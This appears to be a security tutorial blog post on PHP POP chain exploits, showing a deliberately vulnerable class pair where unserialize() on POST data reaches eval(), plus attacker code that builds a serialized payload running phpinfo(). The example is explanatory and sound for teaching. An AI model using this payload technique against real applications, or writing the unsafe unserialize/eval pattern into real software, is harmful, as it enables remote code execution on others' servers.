# PHP Pop Chains

Achieving RCE with POP chain exploits.

<p align="justify"> Last time, we talked about how PHP’s unserialize() can introduce serious vulnerabilities if it is given user-controlled input.

<p align="justify"> In a nutshell, when an attacker controls a serialized object that is passed into unserialize(), she can control the properties of the created object. This will then allow her the opportunity to hijack the flow of the application, by controlling the values passed into magic methods like __wakeup().

<p align="justify"> This works… sometimes. The problem is this: what if the declared magic methods of the class do not contain any useful code in terms of exploitation? Then the unsafe deserialization is useless and the exploit is bust, right?

<p align="justify"> Unfortunately, even if the magic methods themselves are not exploitable, an attacker could still wreak havoc using something called POP chains. POP stands for Property Oriented Programming, and the name comes from the fact that the attacker can control all of the properties of the deserialized object. Similar to ROP attacks (Return Oriented Programming), POP chains work by chaining code “gadgets” together to achieve the attacker’s ultimate goal. These “gadgets” are code snippets borrowed from the codebase that the attacker uses to further her goal.

An example chainPermalink
<p align="justify"> POP chains use magic methods as the initial gadget, which then calls other gadgets. Consider the following example:

````
class Example{

   private $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __wakeup()
   {
      if (isset($this->obj)) return $this->obj->evaluate();
   }
}

class CodeSnippet{

   private $code;

   function evaluate()
   {
      eval($this->code);
   }
}

// some PHP code...

$user_data = unserialize($_POST['data']);

// some PHP code...

````

<p align="justify"> In this example, there are two classes defined: Example and CodeSnippet.

<p align="justify"> Example has a property named obj and when an Example object is deserialized, its __wakeup() function is called, and the evaluate() method of obj is called.

<p align="justify"> The CodeSnippet class has a property named code, which contains the code string to be executed, and an evaluate() method, which calls eval() on the code string.

<p align="justify"> The program takes in POST parameter data from the user, and calls unserialize() on data.

What can the attacker do?

An attacker can use the following code to generate the injected serialized object:

```
class CodeSnippet
{
   private $code = "phpinfo();";
}

class Example
{
   private $obj;

   function __construct()
   {
      $this->obj = new CodeSnippet;
   }
}
````

print urlencode(serialize(new Example));

What this block of code does is the following:

* Define a class named CodeSnippet, and set its code property to “phpinfo();”.
* Define a class named Example, and set its obj property to a new instance to a new CodeSnippet instance on instantiation.
* Create an Example instance, serialize and URL encode the serialized string.
* The attacker can then feed the generated string into the POST parameter data, and this is what the program would do:
* Unserialize the object, create an Example instance.
* Call __wakeup(), see that the obj property is set to a CodeSnippet instance.
* Call the evaluate() method of the obj, which runs eval(“phpinfo();”).
* This is how an attacker can achieve RCE by chaining and reusing code found in the application’s codebase.
